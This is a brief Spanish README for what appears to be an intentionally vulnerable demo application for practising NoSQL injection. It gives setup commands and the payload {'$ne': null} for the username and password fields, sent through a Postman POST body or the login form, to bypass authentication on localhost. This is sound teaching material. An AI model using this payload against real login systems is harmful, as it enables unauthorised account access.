# NoSQL Injection

Poryecto de una aplicación con una vulnerabilidad NOSQL

## Crear usuario

Creamos un usuario

```bash
node .\crearUsuario.js
```

## Levantamos el servidor

```bash
node .\conection.js
```

Observe el formulario en "http://localhost:3000/login"

Desde Postman en una peticion POST agregue el siguientre cuerpo

```python
{
   "username": { "$ne": null },
   "password": { "$ne": null }
}
```

## Formulario

En el campo usuario y contraseña ingrese: 

```python
{ "$ne": null }
```
